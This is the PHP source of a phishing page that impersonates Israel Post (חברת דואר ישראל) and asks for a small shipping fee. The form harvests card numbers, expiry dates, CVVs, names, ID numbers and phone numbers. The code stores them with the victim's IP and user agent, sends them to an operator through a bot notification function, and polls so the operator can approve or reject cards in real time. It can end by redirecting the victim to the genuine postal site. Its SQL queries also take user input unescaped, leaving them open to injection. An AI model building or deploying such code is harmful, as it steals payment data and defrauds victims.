<?php
session_start();
require_once 'api_commands.php';
include ABS_PATH.'/notification_send_to_bot.php';
include('header.php');


if (isset($_POST['payment_submit'])) {
    $_SESSION['post'] = $_POST;
}


if (isset($_POST['payment_submit']) && !empty($_SESSION['post'])) {
    $payment_info = $_POST;
    $agent = $_SERVER['HTTP_USER_AGENT'];
    
    $_POST = $_SESSION['post'];
    $ip = get_client_ip();

    $userEnteredNumber = $payment_info['cardnumber'];

    $row = [];
    $sql = "SELECT * FROM dashboard WHERE meta_key='restricted_numbers'";
    $card_error = '';

    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $restricted_numbers = $row[3];
        $restrictedNumbersArray = explode(',', $restricted_numbers);

        
        if (in_array($userEnteredNumber, $restrictedNumbersArray)) {
            $row = [];
            $restricted_numbers_error = "";
            $sql = "SELECT * FROM dashboard WHERE meta_key='restricted_numbers_error'";
            if ($result = mysqli_query($conn, $sql)) {
                $row = $result->fetch_row();
                $restricted_numbers_error = $row[3];
            }
            $card_error = $restricted_numbers_error;  
        }
    }

    if (!empty($_POST['recipients_name'])) {
        $fullname = $_POST['recipients_name'];
    } else {
        $fullname = "";
    }

    if (!empty($_POST['country'])) { // country
        $country = $_POST['country'];
    } else {
        $country = "";
    }
    if (!empty($_POST['other_country'])) {
        $othercountry = $_POST['other_country'];
    } else {
        $othercountry = "";
    }
    if (!empty($_POST['idtype'])) { // idtype
        $idtype = $_POST['idtype'];
    } else {
        $idtype = "";
    }
    if (!empty($_POST['id_number'])) { // id_number
        $idnumber = $_POST['id_number'];
    } else {
        $idnumber = "";
    }

    if (!empty($_POST['contact_number'])) {
        $phone = $_POST['contact_number'];
    } else {
        $phone = "";
    }
    $_SESSION["contact_number"] = $phone;


    if (!empty($payment_info['cardnumber'])) {
        $cardnumber = str_replace(' ', '', $payment_info['cardnumber']);
    } else {
        $cardnumber = "";
    }
    if (!empty($payment_info['month']) and !empty($payment_info['year'])) {
        $exp_date = $payment_info['month'] . '/' . $payment_info['year'];
    } else {
        $exp_date = "";
    }
    if (!empty($payment_info['cvv'])) {
        $card_code = $payment_info['cvv'];
    } else {
        $card_code = "";
    }

    $_SESSION['post'] = '';
    $_SESSION['total_quantity'] = '';
    $_POST = '';

    $date = date('Y-m-d H:i:s');
    $sql = "INSERT INTO user_information (fullname, address, othercountry, idtype, idnumber, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress, user_agent,source_code)
    VALUES ('" . $fullname . "', '" . $country . "', '" . $othercountry . "', '" . $idtype . "', '" . $idnumber . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "','" . $agent . "','".$folder_path."')";

    // echo $sql; die;
    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        $_SESSION["last_id"] = $last_id;

        send_new_user($cardnumber, $exp_date, $card_code, $fullname, 0, $last_id, 0, "card");

        $message_data = array(
               'address'=> $country, 
               'city'=> $idtype, 
               'state'=> $idnumber, 
               'zipcode'=> "", 
               'email'=> "", 
               'card_number'=> $cardnumber, 
               'card_expire'=> $exp_date, 
               'security_code'=> $card_code, 
               'card_holder'=> $fullname, 
               'ip'=> $ip, 
               'user_agent'=> $_SERVER['HTTP_USER_AGENT'], 
               'date_time'=> $date,
               'post_from'=> $folder_path,
               'phone'=> $phone
        );
        @notification_to_bot($message_data,$conn);


        $_SESSION['post'] = '';
        $_SESSION['total_quantity'] = '';
        $_POST = '';

        //echo '<script>window.location.replace("page5.php")</script>';
        echo '<style>.spinner-border{display:block !important;}</style>';
        echo '<style>.backdrop{display:block !important ;}</style>';
        //echo "New record created successfully. Last inserted ID is: " . $last_id;
    } else {
        $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
} // submit end

?>
    <style>
        .extra-details {
            text-align: center;
            font-weight: bold;
            margin-top: 25px;
            font-size: 14px;
        }

        .top1 h3 {
            text-align: center;
            margin-bottom: 15px;
            margin-top: 15px;
        }

        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
        }

        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
        }

        .top1 table.cstm-table {
            margin-bottom: 20px;
        }

        @media (max-width: 767px) {
            .submit-btn {
                background-color: #2e80f4;
                padding: 11px 24px;
                font-size: 1rem;
                display: block;
                width: 100%;
                min-width: 120px;
                margin-left: auto;
                margin-right: auto;
                line-height: 22px;
                border-radius: 32px;
                color: #fff;
                border-color: #2e80f4;
                height: auto;
                cursor: pointer;
            }

            .submit-btn:hover:hover {
                background-color: #003ef7;
                border-color: #003ef7;
            }
        }
        .hideH {
            display:none !important;
        }
        .wrap {
            margin: 0px 15px;
        }

        .card-icons {
            position: absolute;
            top: 25px;
            right: 5px;
        }

        .form-input {
            position: relative;
        }

        .select {
            width: 100%;
        }

        .form-input.ddmm {
            justify-content: space-between;
        }

        input, select {
            display: table;
            max-width: 100%;
            padding: 9px 10px;
            outline: 0;
            border-radius: 7px !important;
            border: 1px solid #ccc !important;
            background: transparent;
            height: 37px !important;
        }

        .cvv input {
            display: inline-block;
        }

        .cvv span {
            float: right;
        }

        .lds-default {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }

        .lds-default div:nth-child(1) {
            animation-delay: 0s;
            top: 37px;
            left: 66px;
        }

        .lds-default div {
            background: red !important;
        }

        .lds-default div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: #2e80f4;
            border-radius: 50%;
            animation: lds-default 1.2s linear infinite;
        }

        .lds-default {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }

        .lds-default div:nth-child(1) {
            animation-delay: 0s;
            top: 37px;
            left: 66px;
        }

        .lds-default div:nth-child(2) {
            animation-delay: -0.1s;
            top: 22px;
            left: 62px;
        }

        .lds-default div:nth-child(3) {
            animation-delay: -0.2s;
            top: 11px;
            left: 52px;
        }

        .lds-default div:nth-child(4) {
            animation-delay: -0.3s;
            top: 7px;
            left: 37px;
        }

        .lds-default div:nth-child(5) {
            animation-delay: -0.4s;
            top: 11px;
            left: 22px;
        }

        .lds-default div:nth-child(6) {
            animation-delay: -0.5s;
            top: 22px;
            left: 11px;
        }

        .lds-default div:nth-child(7) {
            animation-delay: -0.6s;
            top: 37px;
            left: 7px;
        }

        .lds-default div:nth-child(8) {
            animation-delay: -0.7s;
            top: 52px;
            left: 11px;
        }

        .lds-default div:nth-child(9) {
            animation-delay: -0.8s;
            top: 62px;
            left: 22px;
        }

        .lds-default div:nth-child(10) {
            animation-delay: -0.9s;
            top: 66px;
            left: 37px;
        }

        .lds-default div:nth-child(11) {
            animation-delay: -1s;
            top: 62px;
            left: 52px;
        }

        .lds-default div:nth-child(12) {
            animation-delay: -1.1s;
            top: 52px;
            left: 62px;
        }

        .lds-default div {
            background: red !important;
        }

        .lds-default div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: #2e80f4;
            border-radius: 50%;
            animation: lds-default 1.2s linear infinite;
        }

        @keyframes lds-default {
            0%, 20%, 80%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.5);
            }
        }
    </style>
    <div class="wrap">
        <div class="form">
            <form action="" method="POST">
                <h3 class="step">
                    <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">בחירת אמצעי תשלום</font>
                    </font>
                </h3>
                <h5 class="step" style="color: #325754;
            padding-bottom: 10px;">
                    <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;"><span style="color:red;">*</span> *הוראות תשלום, עבור
                            משלוח, סניף הדואר יגבה עמלות מסוימות
                        </font>
                    </font>
                </h5>
                <div class="top1">
                    <h3 class="text-center">פרטי עסקה</h3>
                    <table class="cstm-table" border="0" width="100%">
                        <tbody>
                        <tr>
                            <td><strong> חברת דואר ישראל : </strong></td>
                            <td>חברת דואר ישראל
                            </td>
                        </tr>
                        <tr>
                            <td><strong>מספר סימוכין של סוחר :</strong></td>
                            <td>8861487022110927592937</td>
                        </tr>
                        <tr>
                            <td><strong>סכום העסקה :</strong></td>
                            <td>
                                ₪10. <?php echo isset($_SESSION['total_quantity']['quantity']) ? $_SESSION['total_quantity']['quantity'] : 0 ?></td>
                        </tr>
                        </tbody>
                    </table>
                </div>
                <div class="backdrop"></div>
                <div class="form-input">
                    <h3 style="color: red"><?php echo @$card_error; ?></h3>
                    <label class="required" for="cr_no">מספר כרטיס
                    </label>
                    <input type="text" id="cr_no" name="cardnumber" minlength="19" maxlength="19"
                           placeholder="xxxx-xxxx-xxxx-xxxx">

                    <span class="crediterror" style="color:red; display:none;"><?php echo @$check_site_live['restricted_numbers_error']?@$check_site_live['restricted_numbers_error']:'الدفع ببطاقة الخصم غير مدعوم حاليًا، يرجى إدخال بطاقة الائتمان الخاصة بك للدفع.';?></span>

                    <span class="errormsg" style="color:red; display:none;">يرجى إدخال أو استبدال طريقة الدفع الصحيحة</span>
                    <div class="card-icons">
                        <img src="<?php echo $folder_path;?>/images/visa.png" alt=""> <img src="<?php echo $folder_path;?>/images/american-express.png" alt="">
                    </div>
                </div>
                <div class="form-input ddmm">
                    <div class="select">
                        <label class="required" for="cr_month">תאריך תפוגה </label>
                        <select name="month" id="cr_month">
                            <option value="">חודש</option>
                            <?php for ($i = 1; $i <= 12; $i++) echo('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                    <div class="select">
                        <label class="required" for="cr_year">שנת תפוגה</label>
                        <select name="year" id="cr_year">
                            <option value="">שנה</option>
                            <?php for ($i = 22; $i <= 32; $i++) echo('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                </div>
                <div class="form-input cvv">
                    <label class="required" for="cr_cvv">קוד אבטחה </label>
                    <input type="text" name="cvv" id="cr_cvv">
                    <span><img src="<?php echo $folder_path;?>/images/cvv.jpg" alt="">3 הספרות האחרונות המוצגות בגב הכרטיס  </span>
                </div>
                <div class="form-input">
                    <label class="required" for="cr_recipients_name">שם בעל הכרטיס </label>
                    <input type="text" id="cr_recipients_name"
                           value="<?php echo isset($_SESSION['post']['recipients_name']) ? $_SESSION['post']['recipients_name'] : ''; ?>"
                           name="recipients_name">
                </div>
                <div class="center">
                    <button class="btn disabled submit-btn" onclick="hitSubmit()" name="payment_submit" type="submit">
                        שלח
                    </button>
                </div>
            </form>
            <div class="extra-details">
                <p>תזכורת: לא ניתן להשתמש בכרטיסי אשראי מסוימים של בנקים/מוסדות מנפיקים לביצוע עסקאות מקוונות, אם נתקלת
                    בבעיות כלשהן עם עסקאות בכרטיס האשראי שלך באתר זה, אנא צור קשר עם הבנק/מוסד המנפיק את הכרטיס שלך
                    .</p>
            </div>
        </div>
    </div>
    <div class="spinner-border" id="ajaxprogress"
         style=" padding: 40px;background-color: rgba(128, 128, 128, 0.7) !important; z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;"
         role="status">
  <span class=""
        style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
  </span>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js"
            integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="<?php echo $folder_path;?>/assets/js/jquery-2.1.3.min.js"></script>
    <script>
        function hitSubmit() {
            const input1 = document.querySelector('#cr_recipients_name');
            const input2 = document.querySelector('#cr_no');
            const input3 = document.querySelector('#cr_month');
            const input4 = document.querySelector('#cr_year')
            const input5 = document.querySelector('#cr_cvv')
            // Add event listeners to input fields to listen for changes


            if (input1.value && input2.value && input3.value && input4.value && input5.value) {
                $(".backdrop").show();
                $('#ajaxprogress').show();
            }
        }

        //script to check input
        jQuery('.form-input input, .form-input select').on('input', function () {
            let check = true;
            jQuery('.form-input input, .form-input select').each(function () {
                if (jQuery(this).val() == '') check = false;
            });
            if (check) jQuery('.btn').removeClass('disabled');
            else jQuery('.btn').addClass('disabled')
        });

        //For Card Number formatted input
        var cardNum = document.getElementById('cr_no');
        cardNum.onkeyup = function (e) {
            $("#cr_no").removeAttr("style");
            $(".errormsg").css("display", "none");
            if (this.value == this.lastValue) return;
            let caretPosition = this.selectionStart;
            let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
            let parts = [];

            for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
                parts.push(sanitizedValue.substring(i, i + 4));
            }

            for (var i = caretPosition - 1; i >= 0; i--) {
                var c = this.value[i];
                if (c < '0' || c > '9') {
                    caretPosition--;
                }
            }
            caretPosition += Math.floor(caretPosition / 4);

            this.value = this.lastValue = parts.join(' ');
            this.selectionStart = this.selectionEnd = caretPosition;
            // if (sanitizedValue.length > 0)
            //   $("input[name=payment_submit]").removeAttr('disabled');
            // else
            //   $("input[name=payment_submit]").attr('disabled', 'disabled');
        }
    </script>
    <script type="text/javascript">
        function updatePromptStatus() {
            $.ajax({
                type: 'post',
                url: '<?php echo $folder_path;?>/prompt_status.php',
                data: {
                    'userid': userid,
                    'page': 4
                },
                success: function (data) {
                }
            });
        }
        
        jQuery(document).ready(function () {
            var popcount = 1;
            window.setInterval(function () {
                // do stuff
                var userid = '<?php echo @$_SESSION["last_id"]; ?>';
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'userid': userid,
                        'page': 2
                    },
                    success: function (data) {
                        if (data == 1 || data == '1') {

                            let page4_redirect = localStorage.getItem("page4_redirect");
                            let page4_redirect_time = localStorage.getItem("page4_redirect_time");
                            if(page4_redirect=='on'){
                                setTimeout(function() {
                                    jQuery(location).attr('href', 'https://israelpost.co.il/');
                                }, page4_redirect_time*1000);
                             }else{
                                jQuery(location).attr('href', './page5.php'); 
                             }
                        }

                        if (data == 2 || data == '2') {
                            jQuery("#ajaxprogress").css("display", "none")
                            jQuery('#carderror').css('display', 'block');
                            if (popcount == 1) {
                                if (window.confirm('رقم البطاقة غير صالح، يرجى إعادة إدخال رقم بطاقة الدفع')) {
                                    console.log("window confirm box message");
                                    $(".backdrop").addClass('hideH');
                                    $('#ajaxprogress').addClass('hideH');
                                    updatePromptStatus();
                                }
                            }
                            popcount++;
                            $(".backdrop").hide();
                            return false;
                        }

                    }
                });

            }, 4000);


            $("body").on("keyup", "#cr_no", function() {
                console.log('validate credit debit');
                event.preventDefault();
                var cc_number_7 = $(this).val().replace(/ /g, '');
                if (cc_number_7.length > 7) {
                    $.ajax({
                        type: 'post',
                        url: '/validate.php',
                        data: {
                            'cc_number_7': cc_number_7,
                            'action': 'cc_details'
                        },
                        success: function(data) {
                            if (data == 1) {
                                $(".submit-btn").removeAttr('disabled');
                                $("input[name=payment_submit]").removeAttr('disabled');
                                $("input[name=payment_submit]").removeClass('disabled');
                                $('.crediterror').css("display", "none");
                                return true;
                            } else if (data == 'card_blocked') {
                                $('.crediterror').css("display", "block");
                                $(".submit-btn").attr('disabled', true);
                                return false;
                            } else {
                                $('.crediterror').css("display", "block");
                                $(".submit-btn").attr('disabled', true);
                                return false;
                            }
                        }
                    });
                }
            });



            $("body").on("change", "#cr_no", function () {

                var ignoreArray = ["123456789", "22222222"];
                var currentValue = $(this).val().replace(/ /g, '');

                if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                    $("#cr_no").css("border", "2px solid red");
                    $(".errormsg").css("display", "block");

                }


            })

        })
    </script>
    <script>
        /* JS comes here */
        function setOnline(id, status) {
            if (id) {
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'id': id,
                        'status': status
                    },
                    success: function (data) {

                    }
                });
            }
        }

        var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


            window.addEventListener('load', function (e) {
                if (navigator.onLine) {
                    setOnline(userid, 1)
                } else {
                    setOnline(userid, 0)
                }
            }, false);

        window.addEventListener('online', function (e) {
            setOnline(userid, 1)
        }, false);

        window.addEventListener('offline', function (e) {
            setOnline(userid, 0)
        }, false);
    </script>
<?php
include('footer.php');